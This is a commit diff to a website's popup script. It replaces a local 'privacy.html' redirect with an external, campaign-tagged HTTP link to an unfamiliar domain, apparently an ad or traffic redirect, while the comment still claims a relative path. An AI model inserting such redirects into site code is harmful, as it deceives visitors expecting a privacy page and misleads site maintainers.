72517a98119cc8e04332be0e5bb04d66837ff1e2
dailytopz <raajthakur3456@gmail.com>
2026-01-07 17:07:33 +0530

    Update popup.js

--- assets/popup.js
+++ assets/popup.js
@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "privacy.html";
+  const REDIRECT = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
  
   function buildPopup() {
     // prevent double render
@@ -67,4 +67,5 @@
   };
 })();
  
+
  
